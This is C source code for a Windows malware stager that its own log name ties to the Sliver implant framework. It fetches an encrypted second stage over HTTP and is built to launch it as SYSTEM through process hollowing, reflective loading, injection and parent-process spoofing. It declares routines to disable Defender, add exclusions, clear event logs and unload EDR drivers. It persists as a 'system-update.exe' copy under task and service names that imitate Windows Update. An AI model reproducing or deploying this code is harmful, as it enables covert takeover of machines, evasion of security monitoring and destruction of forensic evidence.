#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif

#include <windows.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <sddl.h>
#include <taskschd.h>
#include <winevt.h>
#include <comdef.h>
#include <comutil.h>
#include <wbemidl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <wchar.h>
#include <stdarg.h>
#include <winsvc.h>
#include "token_utils.h"
#include "persistence.h"
#include "watchdog.h"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wevtapi.lib")

#define STAGE_USE_SYSCALLS 1

#ifndef STAGE_VERBOSE
#define STAGE_VERBOSE 0
#endif

#ifndef STAGE_PERSISTENCE
#define STAGE_PERSISTENCE 0
#endif

#ifndef STAGE_PERSISTENCE_MODE
#define STAGE_PERSISTENCE_MODE 0
#endif

#ifndef STAGE_WATCHDOG
#define STAGE_WATCHDOG 0
#endif

#ifndef STAGE_SYSTEM_STANDALONE
#define STAGE_SYSTEM_STANDALONE 0
#endif

#ifndef STAGE_SYSTEM_INJECTION
#define STAGE_SYSTEM_INJECTION 1
#endif

#ifndef STAGE_SPAWN_MODE
#define STAGE_SPAWN_MODE 1
#endif

#ifndef STAGE_LOG_FILE_NAME
#define STAGE_LOG_FILE_NAME "sliver-stager.log"
#endif

#ifndef STAGE_KEEP_VERBOSE_LOG
#define STAGE_KEEP_VERBOSE_LOG 0
#endif

#ifndef STAGE2_URL
#define STAGE2_URL "http://127.0.0.1:8080/asset.bin"
#endif

#ifndef STAGE2_XOR_KEY
#define STAGE2_XOR_KEY "4142434445464748494A4B4C4D4E4F50"
#endif

#ifndef STAGE_BEACON_STATEFUL
#define STAGE_BEACON_STATEFUL 0
#endif

#ifndef STAGE2_URL_DEFAULT
#define STAGE2_URL_DEFAULT "http://127.0.0.1:8080/asset.bin"
#endif

#define STAGE_ARRAY_COUNT(a) (sizeof(a) / sizeof((a)[0]))

#ifndef STAGE_SYSTEM_FALLBACK_TO_USER
#define STAGE_SYSTEM_FALLBACK_TO_USER 0
#endif

#ifndef STAGE_SYSTEM_STRICT
#define STAGE_SYSTEM_STRICT 1
#endif

#if STAGE_SPAWN_MODE != 0 && STAGE_SPAWN_MODE != 1
#undef STAGE_SPAWN_MODE
#define STAGE_SPAWN_MODE 1
#endif

#ifndef STAGE_DISABLE_EDR_HARDENING
#define STAGE_DISABLE_EDR_HARDENING 1
#endif

#ifndef STAGE_ALLOW_DISK_STAGED_EXECUTION
#define STAGE_ALLOW_DISK_STAGED_EXECUTION 1
#endif

#ifndef STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED
#define STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED 1
#endif

#ifndef STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK
#define STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK 1
#endif

#ifndef STAGE_SYSTEM_LOCAL_SERVICE_LAUNCH
#define STAGE_SYSTEM_LOCAL_SERVICE_LAUNCH 0
#endif

#ifndef STAGE_SYSTEM_LAUNCH_TASK_NAME
#define STAGE_SYSTEM_LAUNCH_TASK_NAME L"\\Microsoft\\Windows\\UpdateOrchestrator\\PolicyRefresh"
#endif

#ifndef STAGE_PERSISTENT_STAGER_RUNTIME_ARGUMENT
#define STAGE_PERSISTENT_STAGER_RUNTIME_ARGUMENT "--persistent"
#endif

#ifndef STAGE_SYSTEM_LOCAL_SERVICE_NAME_PREFIX
#define STAGE_SYSTEM_LOCAL_SERVICE_NAME_PREFIX "WaaSRefreshSvc"
#endif

#ifndef STAGE_SYSTEM_LOCAL_SERVICE_DISPLAY_PREFIX
#define STAGE_SYSTEM_LOCAL_SERVICE_DISPLAY_PREFIX "Windows Update Refresh Worker"
#endif

#if STAGE_SPAWN_MODE == 0
#if STAGE_SYSTEM_INJECTION != 0
#undef STAGE_SYSTEM_INJECTION
#define STAGE_SYSTEM_INJECTION 0
#endif
#if STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED != 0
#undef STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED
#define STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED 0
#endif
#if STAGE_SYSTEM_STRICT != 0
#undef STAGE_SYSTEM_STRICT
#define STAGE_SYSTEM_STRICT 0
#endif
#if STAGE_SYSTEM_FALLBACK_TO_USER != 0
#undef STAGE_SYSTEM_FALLBACK_TO_USER
#define STAGE_SYSTEM_FALLBACK_TO_USER 0
#endif
#if STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK != 0
#undef STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK
#define STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK 0
#endif
#if STAGE_SYSTEM_STANDALONE != 0
#undef STAGE_SYSTEM_STANDALONE
#define STAGE_SYSTEM_STANDALONE 0
#endif
#else
#if STAGE_SYSTEM_INJECTION != 1
#undef STAGE_SYSTEM_INJECTION
#define STAGE_SYSTEM_INJECTION 1
#endif
#if STAGE_SYSTEM_STRICT != 1 && STAGE_SYSTEM_STRICT != 0
#undef STAGE_SYSTEM_STRICT
#define STAGE_SYSTEM_STRICT 1
#endif
#if STAGE_SYSTEM_STRICT && STAGE_SYSTEM_FALLBACK_TO_USER != 0
#undef STAGE_SYSTEM_FALLBACK_TO_USER
#define STAGE_SYSTEM_FALLBACK_TO_USER 0
#endif
#endif

#ifndef STAGE_PERSISTENCE_MODE
#define STAGE_PERSISTENCE_MODE 0
#endif

#if STAGE_PERSISTENCE == 0
#undef STAGE_PERSISTENCE_MODE
#define STAGE_PERSISTENCE_MODE 0
#elif STAGE_PERSISTENCE_MODE == 0
#undef STAGE_PERSISTENCE_MODE
#define STAGE_PERSISTENCE_MODE 1
#endif

#if STAGE_PERSISTENCE_MODE > 3
#undef STAGE_PERSISTENCE_MODE
#define STAGE_PERSISTENCE_MODE 3
#endif

#if STAGE_SYSTEM_STRICT
#if STAGE_SYSTEM_LOCAL_SERVICE_LAUNCH != 0
#undef STAGE_SYSTEM_LOCAL_SERVICE_LAUNCH
#define STAGE_SYSTEM_LOCAL_SERVICE_LAUNCH 0
#endif
#if STAGE_DISABLE_EDR_HARDENING != 1
#undef STAGE_DISABLE_EDR_HARDENING
#define STAGE_DISABLE_EDR_HARDENING 1
#endif
#if STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED != 1
#undef STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED
#define STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED 1
#endif
#if STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK != 0
#undef STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK
#define STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK 0
#endif
#if STAGE_ALLOW_DISK_STAGED_EXECUTION != 0
#undef STAGE_ALLOW_DISK_STAGED_EXECUTION
#define STAGE_ALLOW_DISK_STAGED_EXECUTION 0
#endif
#endif

#if STAGE_SYSTEM_INJECTION
#if STAGE_SYSTEM_STRICT && STAGE_SYSTEM_FALLBACK_TO_USER != 0
#undef STAGE_SYSTEM_FALLBACK_TO_USER
#define STAGE_SYSTEM_FALLBACK_TO_USER 0
#endif

#if STAGE_SYSTEM_STANDALONE != 0
#undef STAGE_SYSTEM_STANDALONE
#define STAGE_SYSTEM_STANDALONE 0
#endif

#if STAGE_DISABLE_EDR_HARDENING != 1
#undef STAGE_DISABLE_EDR_HARDENING
#define STAGE_DISABLE_EDR_HARDENING 1
#endif
#endif

#define STAGE2_XOR_KEY_STRINGIZE_HELPER(x) #x
#define STAGE2_XOR_KEY_STRINGIZE(x) STAGE2_XOR_KEY_STRINGIZE_HELPER(x)
#define STAGE2_XOR_KEY_TEXT STAGE2_XOR_KEY_STRINGIZE(STAGE2_XOR_KEY)

#ifndef STAGE2_STARTUP_TIMEOUT_MS
#define STAGE2_STARTUP_TIMEOUT_MS 2500
#endif

#ifndef STAGE2_MEMORY_INJECTION_THREAD_TIMEOUT_MS
#define STAGE2_MEMORY_INJECTION_THREAD_TIMEOUT_MS 500
#endif

#ifndef STAGE2_SPAWN_STARTUP_TIMEOUT_MS
#define STAGE2_SPAWN_STARTUP_TIMEOUT_MS 30000
#endif

#ifndef STAGE2_SYSTEM_STAGING_DIR
#define STAGE2_SYSTEM_STAGING_DIR "SysCache"
#endif

#ifndef STAGE2_SYSTEM_STAGING_SUBDIR
#define STAGE2_SYSTEM_STAGING_SUBDIR STAGE2_SYSTEM_STAGING_DIR
#endif

#ifndef STAGE2_SPAWN_STABLE_MS
#define STAGE2_SPAWN_STABLE_MS 3000
#endif

#ifndef STAGE2_POSTSTART_STABILITY_MS
#define STAGE2_POSTSTART_STABILITY_MS 1000
#endif

#ifndef STAGE_BEACON_STATE_DIRECTORY_NAME
#define STAGE_BEACON_STATE_DIRECTORY_NAME "SysCache"
#endif

#ifndef STAGE_BEACON_STATE_FILE_NAME
#define STAGE_BEACON_STATE_FILE_NAME "runtime.state"
#endif

#ifndef STAGE_BEACON_STATE_TTL_SECONDS
#define STAGE_BEACON_STATE_TTL_SECONDS 120
#endif

#define STAGE_SYSTEM_STAGER_RUNTIME_SDDL_PROTECT "O:SYG:SYD:PAI(A;;FA;;;SY)(A;;FA;;;BA)"
#define STAGE_SYSTEM_STAGER_RUNTIME_SDDL_PROTECT_ALT "O:SYG:SYD:PAI(A;;FA;;;SY)(A;;FA;;;BA)"
#define STAGE_RUNTIME_SWAP_MANIFEST_SUFFIX ".swap"

#define STAGE_FILETIME_UNIX_EPOCH 116444736000000000ULL

static BOOL IsStrictSystemMode(void) {
    return STAGE_SYSTEM_STRICT != 0;
}

static void TerminateProcessIfNotStrict(HANDLE hProcess, DWORD dwExitCode) {
    if (!hProcess || IsStrictSystemMode()) {
        return;
    }
    TerminateProcess(hProcess, dwExitCode);
}

static void LogWritef(BOOL bPrintToConsole, BOOL bWriteToFile, LPCSTR lpFormat, va_list args);
static void LogWrite(BOOL bPrintToConsole, BOOL bWriteToFile, LPCSTR lpFormat, ...);
static void AppendLogFile(LPCSTR lpMessage);
static ULONGLONG GetCurrentUnixTime(void);
static BOOL IsProcessIdRunningPortable(DWORD dwProcessId);
static BOOL IsProcessIdRunning(DWORD dwProcessId);
static BOOL IsConsentProcessRunning(void);
static BOOL IsBeaconStatefulTrackingEnabled(void);
static BOOL BuildBeaconStatePath(LPSTR lpStatePath, size_t cchStatePath);
static BOOL BuildBeaconStatePathFromBase(LPCSTR lpBasePath, LPSTR lpStatePath, size_t cchStatePath);
static BOOL BuildFallbackBeaconStatePath(LPSTR lpStatePath, size_t cchStatePath);
static BOOL BuildBeaconStatePathFromPersistentRuntime(LPSTR lpStatePath, size_t cchStatePath);
static BOOL ReadBeaconStateMarker(DWORD* pdwBeaconPid, DWORD* pdwStagerPid, ULONGLONG* pCreatedUnix);
static BOOL WriteBeaconStateMarkerToPath(LPCSTR lpStatePath, DWORD dwBeaconPid, DWORD dwStagerPid);
static BOOL WriteBeaconStateMarkerWithPids(DWORD dwBeaconPid, DWORD dwStagerPid);
static BOOL WriteBeaconStateMarker(DWORD dwImplantPid);
static BOOL WriteBeaconStateMarkerForCurrentStager(void);
static PBYTE DownloadStage2(LPCSTR lpUrl, PDWORD pdwSize);
static BOOL CopyFileWithTokenA(HANDLE hToken, LPCSTR lpSource, LPCSTR lpTarget, BOOL bFailIfExists);
static BOOL EnsureDirectoryTreeExistsWithToken(LPCSTR lpPath, HANDLE hToken);
static BOOL IsExistingBeaconActive(ULONGLONG ullNow);
static BOOL RunStage2AsSystem(HANDLE hSystemToken, PBYTE pBeacon, DWORD dwBeaconSize);
static BOOL RunReflectiveStage2AsSystem(HANDLE hSystemToken, PBYTE pBeacon, DWORD dwBeaconSize);
static BOOL LaunchStage2Process(PBYTE pBeacon, DWORD dwBeaconSize);
static BOOL LaunchStage2ProcessWithToken(HANDLE hToken, PBYTE pBeacon, DWORD dwBeaconSize);
static BOOL IsValidPePayload(PBYTE pBeacon, DWORD dwSize);
static BOOL BuildMappedSystemPeImage(
    PBYTE pBeacon,
    DWORD dwBeaconSize,
    DWORD_PTR dwRemoteImageBase,
    PBYTE* ppMappedImage,
    SIZE_T* pMappedSize
);
static BOOL ApplyPeRelocations(PBYTE pImage, PIMAGE_NT_HEADERS pNtHeaders, DWORD_PTR dwRemoteBase);
static BOOL ResolvePeImports(PBYTE pImage, PIMAGE_NT_HEADERS pNtHeaders);
static BOOL ApplyRemotePeSectionProtections(HANDLE hProcess, PVOID pRemoteImage, PIMAGE_NT_HEADERS pNtHeaders, SIZE_T imageSize);
static BOOL ReflectiveLoadPE(PBYTE pPEBuffer, SIZE_T peSize);
static BOOL EnsureDirectoryTreeExists(LPCSTR lpPath);
static BOOL ApplyProtectedFilesystemAclWithFallback(LPCSTR lpPath, LPCSTR lpPrimarySddl, LPCSTR lpFallbackSddl);
static BOOL TrySetSystemStagerDirectory(LPSTR lpPath, DWORD cbPath, LPCSTR lpTemplate);
static BOOL GetSystemStagerDirectory(LPSTR lpPath, DWORD cbPath);
static BOOL BuildPendingStagerPath(LPCSTR lpRuntimePath, LPSTR lpPendingPath, size_t cchPendingPath);
static BOOL BuildRuntimeSwapManifestPath(LPCSTR lpTargetPath, LPSTR lpManifestPath, size_t cchManifestPath);
static BOOL BuildRuntimeSwapCommand(LPCSTR lpPendingPath, LPCSTR lpTargetPath, LPSTR lpCommand, size_t cchCommand);
static BOOL WriteRuntimeSwapManifest(LPCSTR lpTargetPath, LPCSTR lpPendingPath);
static BOOL ReadRuntimeSwapManifest(LPCSTR lpManifestPath, LPSTR lpTargetPath, size_t cchTargetPath, LPSTR lpPendingPath, size_t cchPendingPath);
static BOOL DeleteRuntimeSwapManifest(LPCSTR lpManifestPath);
static BOOL LoadRuntimeSwapStateFromManifest(LPCSTR lpTargetPath);
static BOOL ClearRuntimeSwapState(void);
static BOOL SchedulePersistentRuntimeSwapWithToken(HANDLE hSystemToken, LPCSTR lpPendingPath, LPCSTR lpTargetPath);
static BOOL SchedulePersistentRuntimeSwap(LPCSTR lpPendingPath, LPCSTR lpTargetPath);
static BOOL ProcessRuntimeSwapManifest(HANDLE hSystemToken);
static BOOL WriteStage2TempExecutableInDirectory(PBYTE pBeacon, DWORD dwBeaconSize,
                                              LPCSTR lpDirectory, LPSTR lpTempExePath);
static BOOL WriteStage2TempExecutable(PBYTE pBeacon, DWORD dwBeaconSize, LPSTR lpTempExePath);
static BOOL WriteStage2SystemTempExecutable(PBYTE pBeacon, DWORD dwBeaconSize, LPSTR lpTempExePath);
typedef struct _EXTENDED_STARTUPINFO {
    STARTUPINFOEXA si;
    LPPROC_THREAD_ATTRIBUTE_LIST pAttributeList;
    SIZE_T attributeSize;
    HANDLE hParentHandle;
} EXTENDED_STARTUPINFO, *PEXTENDED_STARTUPINFO;

static BOOL InitParentSpoofing(PEXTENDED_STARTUPINFO pExtSi, DWORD dwSpoofedParentPid);
static void CleanupParentSpoofing(PEXTENDED_STARTUPINFO pExtSi);
static DWORD FindLegitimateSystemParent(void);
static BOOL InjectIntoSystemProcessMemoryOnly(HANDLE hSystemToken, PBYTE pBeacon, DWORD dwBeaconSize);
static BOOL HollowLegitimateSystemProcess(HANDLE hSystemToken, PBYTE pBeacon, DWORD dwBeaconSize);
static BOOL LaunchViaWMI(HANDLE hSystemToken, PBYTE pBeacon, DWORD dwBeaconSize);
static BOOL LaunchViaScheduledTask(HANDLE hSystemToken, PBYTE pBeacon, DWORD dwBeaconSize);
static BOOL LaunchViaCreateProcessToken(HANDLE hSystemToken, PBYTE pBeacon, DWORD dwBeaconSize);
static BOOL LaunchViaCreateProcessImpersonated(HANDLE hSystemToken, PBYTE pBeacon, DWORD dwBeaconSize);
static BOOL LaunchViaLocalSystemService(HANDLE hSystemToken, PBYTE pBeacon, DWORD dwBeaconSize);
static BOOL BuildCommandLauncher(
    LPCSTR lpPayloadPath,
    LPSTR lpCmdPath,
    SIZE_T cbCmdPath,
    LPSTR lpCmdArgs,
    SIZE_T cbCmdArgs
);
static BOOL BuildQuotedCommandLine(
    LPCSTR lpPayloadPath,
    LPSTR lpCommandLine,
    SIZE_T cbCommandLine
);
static BOOL WaitForProcessStartByImagePath(LPCSTR lpImagePath, DWORD dwTimeoutMs, PDWORD pdwPid);
static BOOL WaitForSystemProcessStartByPathOrName(LPCSTR lpImagePath, DWORD dwTimeoutMs, PDWORD pdwPid);
static BOOL ValidateChildProcessStartup(HANDLE hProcess, DWORD dwStartupMs);
static BOOL ValidateSystemProcessStartup(HANDLE hProcess, DWORD dwPid, DWORD dwStartupMs);
static BOOL ValidateInjectedThreadStartup(HANDLE hThread, DWORD dwStartupMs);
static BOOL DuplicateTokenForPrimaryCreation(HANDLE hSystemToken, HANDLE* phPrimaryToken);
static BOOL SpawnProcessWithPrimaryToken(
    HANDLE hPrimaryToken,
    LPCSTR lpApplicationPath,
    PHANDLE phProcess,
    PDWORD pdwPid
);
static BOOL SpawnProcessWithPrimaryTokenEx(
    HANDLE hPrimaryToken,
    LPCSTR lpApplicationPath,
    PHANDLE phProcess,
    PDWORD pdwPid,
    PHANDLE phThread,
    DWORD dwExtraCreateFlags
);
static BOOL DuplicateTokenForImpersonation(HANDLE hSystemToken, HANDLE* phImpersonationToken);
static BOOL ParseHexBytes(LPCSTR lpHex, PBYTE pOut, SIZE_T byteCount);
static BOOL GetTokenSessionId(HANDLE hToken, PDWORD pdwSessionId);
static BOOL SetPrimaryTokenSessionId(HANDLE hToken, DWORD dwSessionId);
static BOOL ApplyProtectedFilesystemAcl(LPCSTR lpPath, LPCSTR lpSddl);
static BOOL HardenPersistentStagerImage(LPCSTR lpRuntimePath);
static BOOL IsSystemCandidateProcessName(LPCWSTR lpExeName);
static BOOL EnableAllTokenPrivilegesInToken(HANDLE hToken);
static BOOL EnablePrivilegeForToken(HANDLE hToken, LPCSTR lpPrivilege);
static BOOL EnableSystemTokenPrivileges(HANDLE hToken);
static BOOL HasInternetConnectivity();
static BOOL IsLikelyPlaceholderUrl(LPCSTR lpUrl);
static BOOL PrepareSystemToken(HANDLE hSystemToken, HANDLE* phPreparedToken, DWORD dwSessionId);
static BOOL IsProcessTokenSystem(HANDLE hProcess, DWORD dwPid, LPDWORD pdwErrorCode);
static BOOL TokenHasPrivilege(HANDLE hToken, LPCSTR lpPrivilege);
static int GetSystemTokenPriority(LPCWSTR lpExeName, BOOL bCanLaunch);
static BOOL ContainsCaseInsensitive(LPCSTR lpHaystack, LPCSTR lpNeedle);
static BOOL ExecuteSystemCommand(HANDLE hSystemToken, LPCSTR lpCommandLine);
static BOOL DisableDefenderViaServiceDependency(HANDLE hSystemToken);
static BOOL AddDefenderExclusions(HANDLE hSystemToken);
static BOOL ClearSpecificEventLogs(HANDLE hSystemToken);
static BOOL UnloadEDRDrivers(HANDLE hSystemToken);
static BOOL IsSystemTokenCandidateBlacklisted(LPCWSTR lpExeName);
static BOOL IsSystemTokenCandidateUsableForLaunch(LPCWSTR lpExeName, BOOL bCanLaunch);
static BOOL IsBlacklistedEdrServiceName(LPCSTR lpServiceName);
static BOOL IsPersistentRuntime(LPCSTR lpArgument);
static BOOL BuildPersistentStagerImagePath(LPSTR lpOutPath, size_t cchOutPath, HANDLE hTokenForPathCreate);
static BOOL CopyStagerToPersistentPath(
    LPCSTR lpOriginalPath,
    LPSTR lpPersistentPath,
    size_t cchPersistentPath,
    HANDLE hToken
);
static BOOL ScheduleSelfDelete(LPCSTR lpSelfPath);

#define LOGV(...) do { LogWrite(STAGE_VERBOSE, STAGE_KEEP_VERBOSE_LOG || STAGE_VERBOSE, __VA_ARGS__); } while (0)
#define LOGE(...) do { LogWrite(TRUE, TRUE, __VA_ARGS__); } while (0)

static DWORD gBeaconImplantPid = 0;
static char gRuntimeSwapPendingTargetPath[MAX_PATH] = { 0 };
static char gRuntimeSwapPendingSourcePath[MAX_PATH] = { 0 };

static void AppendLogFile(LPCSTR lpMessage) {
    char tempPath[MAX_PATH] = {0};
    char logPath[MAX_PATH] = {0};
    DWORD tempLen = GetTempPathA(MAX_PATH, tempPath);
    if (tempLen && tempLen < MAX_PATH - 1) {
        _snprintf(logPath, MAX_PATH, "%s%s", tempPath, STAGE_LOG_FILE_NAME);
    } else {
        _snprintf(logPath, MAX_PATH, ".\\%s", STAGE_LOG_FILE_NAME);
    }

    HANDLE hLog = CreateFileA(logPath, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
                             NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hLog == INVALID_HANDLE_VALUE) {
        _snprintf(logPath, MAX_PATH, ".\\%s", STAGE_LOG_FILE_NAME);
        hLog = CreateFileA(logPath, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
                           NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
        if (hLog == INVALID_HANDLE_VALUE) {
            return;
        }
    }

    DWORD bytesWritten = 0;
    SYSTEMTIME st;
    GetLocalTime(&st);
    char logLine[MAX_PATH * 2] = {0};
    int logLineLen = _snprintf(logLine, sizeof(logLine), "[%04u-%02u-%02u %02u:%02u:%02u.%03u] %s",
                               st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, st.wMilliseconds, lpMessage);

    if (logLineLen < 0) {
        CloseHandle(hLog);
        return;
    }

    DWORD messageLen = (DWORD)strlen(logLine);
    if (messageLen && messageLen < sizeof(logLine) && logLine[messageLen - 1] != '\n') {
        logLine[messageLen++] = '\r';
        logLine[messageLen++] = '\n';
        logLine[messageLen] = '\0';
    }

    WriteFile(hLog, logLine, (DWORD)strlen(logLine), &bytesWritten, NULL);
    CloseHandle(hLog);
}

static ULONGLONG GetCurrentUnixTime(void) {
    FILETIME ftNow = { 0 };
    GetSystemTimeAsFileTime(&ftNow);

    ULONGLONG ullNow = ((ULONGLONG)ftNow.dwHighDateTime << 32) | ftNow.dwLowDateTime;
    if (ullNow <= STAGE_FILETIME_UNIX_EPOCH) {
        return 0;
    }
    return (ullNow - STAGE_FILETIME_UNIX_EPOCH) / 10000000ULL;
}

static BOOL IsPersistentRuntime(LPCSTR lpArgument) {
    if (!lpArgument || !*lpArgument) {
        return FALSE;
    }

    return _stricmp(lpArgument, STAGE_PERSISTENT_STAGER_RUNTIME_ARGUMENT) == 0;
}

static BOOL BuildPersistentStagerImagePath(LPSTR lpOutPath, size_t cchOutPath, HANDLE hTokenForPathCreate) {
    if (!lpOutPath || cchOutPath == 0) {
        return FALSE;
    }
    (void)hTokenForPathCreate;

    char basePath[MAX_PATH] = { 0 };
    char candidateBase[MAX_PATH] = { 0 };
    char tempPath[MAX_PATH] = { 0 };
    const char* lpCandidates[] = {
        "%SystemRoot%\\System32\\" STAGE_BEACON_STATE_DIRECTORY_NAME,
        "%SystemRoot%\\Temp\\" STAGE_BEACON_STATE_DIRECTORY_NAME,
        "%ProgramData%\\" STAGE_BEACON_STATE_DIRECTORY_NAME,
        "%TEMP%\\" STAGE_BEACON_STATE_DIRECTORY_NAME,
        "%TMP%\\" STAGE_BEACON_STATE_DIRECTORY_NAME
    };

    for (int i = 0; i < STAGE_ARRAY_COUNT(lpCandidates); i++) {
        DWORD expandedLen = ExpandEnvironmentStringsA(lpCandidates[i], candidateBase, MAX_PATH);
        if (expandedLen == 0 || expandedLen >= MAX_PATH) {
            LOGV("[-] Failed expanding persistent runtime candidate %s (%lu)\n", lpCandidates[i], GetLastError());
            continue;
        }

        if (_snprintf(basePath, MAX_PATH, "%s", candidateBase) < 0) {
            continue;
        }

        if (_snprintf(candidateBase, MAX_PATH, "%s", basePath) < 0) {
            continue;
        }
        if (strstr(candidateBase, "%") != NULL) {
            LOGV("[-] Candidate contains unresolved environment variable: %s\n", lpCandidates[i]);
            continue;
        }

        if (!EnsureDirectoryTreeExists(basePath)) {
            LOGV("[-] Persistent runtime path candidate not writable: %s\n", basePath);
            continue;
        }

        if (_snprintf(
                lpOutPath,
                cchOutPath,
                "%s\\system-update.exe",
                basePath
            ) > 0) {
            return TRUE;
        }
    }

    DWORD tempLen = GetEnvironmentVariableA("TEMP", tempPath, MAX_PATH);
    if (tempLen == 0 || tempLen >= MAX_PATH) {
        tempLen = GetTempPathA(MAX_PATH, tempPath);
    }
    if (tempLen > 0 && tempLen < MAX_PATH) {
        size_t tempLenNoSlash = strnlen(tempPath, MAX_PATH);
        if (tempLenNoSlash > 0 &&
            (tempPath[tempLenNoSlash - 1] == '\\' || tempPath[tempLenNoSlash - 1] == '/')) {
            tempPath[tempLenNoSlash - 1] = '\0';
        }
        if (_snprintf(basePath, MAX_PATH, "%s\\%s", tempPath, STAGE_BEACON_STATE_DIRECTORY_NAME) < 0) {
            return FALSE;
        }
        if (!EnsureDirectoryTreeExists(basePath)) {
            LOGV("[-] Fallback persistent runtime path candidate not writable: %s\n", basePath);
        } else if (_snprintf(
                lpOutPath,
                cchOutPath,
                "%s\\system-update.exe",
                basePath
            ) > 0) {
            LOGV("[*] Using fallback temp persistent runtime image path %s\n", lpOutPath);
            return TRUE;
        }
    }

    if (GetModuleFileNameA(NULL, tempPath, MAX_PATH) > 0 && tempPath[0] != '\0') {
        char moduleDir[MAX_PATH] = { 0 };
        if (_snprintf(moduleDir, MAX_PATH, "%s", tempPath) > 0) {
            char* lastSlash = strrchr(moduleDir, '\\');
            if (!lastSlash) {
                lastSlash = strrchr(moduleDir, '/');
            }
            if (lastSlash && (size_t)(lastSlash - moduleDir) < MAX_PATH - 1) {
                *lastSlash = '\0';
                if (_snprintf(basePath, MAX_PATH, "%s\\%s", moduleDir, STAGE_BEACON_STATE_DIRECTORY_NAME) > 0) {
                    if (EnsureDirectoryTreeExists(basePath) &&
                        _snprintf(
                            lpOutPath,
                            cchOutPath,
                            "%s\\system-update.exe",
                            basePath
                        ) > 0) {
                        LOGV("[*] Using module-directory fallback persistent runtime image path %s\n", lpOutPath);
                        return TRUE;
                    }
                }
            }
        }
    }

    return FALSE;
}

static BOOL CopyFileWithTokenA(HANDLE hToken, LPCSTR lpSource, LPCSTR lpTarget, BOOL bFailIfExists) {
    if (!hToken) {
        return CopyFileA(lpSource, lpTarget, bFailIfExists);
    }

    HANDLE hImpersonationToken = NULL;
    if (!DuplicateTokenForImpersonation(hToken, &hImpersonationToken)) {
        LOGV("[-] DuplicateTokenForImpersonation failed for persistent copy; falling back to current token context.\n");
        return CopyFileA(lpSource, lpTarget, bFailIfExists);
    }

    if (!SetThreadToken(NULL, hImpersonationToken)) {
        LOGV("[-] SetThreadToken failed for persistent copy; falling back to current token context (%lu)\n", GetLastError());
        CloseHandle(hImpersonationToken);
        return CopyFileA(lpSource, lpTarget, bFailIfExists);
    }

    BOOL bCopied = CopyFileA(lpSource, lpTarget, bFailIfExists);
    RevertToSelf();
    CloseHandle(hImpersonationToken);
    return bCopied;
}

static BOOL EnsureDirectoryTreeExistsWithToken(LPCSTR lpPath, HANDLE hToken) {
    if (!lpPath) {
        return FALSE;
    }

    if (!hToken) {
        return EnsureDirectoryTreeExists(lpPath);
    }

    HANDLE hImpersonationToken = NULL;
    if (!DuplicateTokenForImpersonation(hToken, &hImpersonationToken)) {
        LOGV("[-] DuplicateTokenForImpersonation failed for directory creation; using current token context.\n");
        return EnsureDirectoryTreeExists(lpPath);
    }

    if (!SetThreadToken(NULL, hImpersonationToken)) {
        LOGV("[-] SetThreadToken failed for directory creation; using current token context (%lu)\n", GetLastError());
        CloseHandle(hImpersonationToken);
        return EnsureDirectoryTreeExists(lpPath);
    }

    BOOL bResult = EnsureDirectoryTreeExists(lpPath);
    RevertToSelf();
    CloseHandle(hImpersonationToken);
    return bResult;
}

static BOOL CopyStagerToPersistentPath(
    LPCSTR lpOriginalPath,
    LPSTR lpPersistentPath,
    size_t cchPersistentPath,
    HANDLE hToken
) {
    if (!lpOriginalPath || !*lpOriginalPath || !lpPersistentPath || cchPersistentPath == 0) {
        return FALSE;
    }

    if (!lpPersistentPath[0]) {
        return FALSE;
    }

    if (lstrcmpiA(lpPersistentPath, lpOriginalPath) == 0) {
        LOGV("[+] Using existing persistent runtime image at %s\n", lpPersistentPath);
        return TRUE;
    }

    DWORD attrs = GetFileAttributesA(lpPersistentPath);
    if (attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY)) {
        LOGV("[+] Existing persistent runtime image detected at %s; reusing existing copy.\n", lpPersistentPath);
        if (!HardenPersistentStagerImage(lpPersistentPath)) {
            LOGV("[-] Failed to harden existing persistent stager runtime image at %s\n", lpPersistentPath);
        }
        return TRUE;
    }

    if (!CopyFileWithTokenA(hToken, lpOriginalPath, lpPersistentPath, FALSE)) {
        DWORD dwCopyErr = GetLastError();
        if (attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY)) {
            LOGV("[+] Persistent runtime image already exists; reusing existing copy at %s (copy was denied with %lu)\n", lpPersistentPath, dwCopyErr);
            if (!HardenPersistentStagerImage(lpPersistentPath)) {
                LOGV("[-] Failed to harden existing persistent stager runtime image at %s\n", lpPersistentPath);
            }
            return TRUE;
        }

        LOGV("[-] Failed to copy stager into persistence image path %s (%lu)\n", lpPersistentPath, dwCopyErr);
        return FALSE;
    }

    if (!HardenPersistentStagerImage(lpPersistentPath)) {
        LOGV("[-] Failed to harden copied persistent stager runtime image at %s\n", lpPersistentPath);
    }

    return TRUE;
}

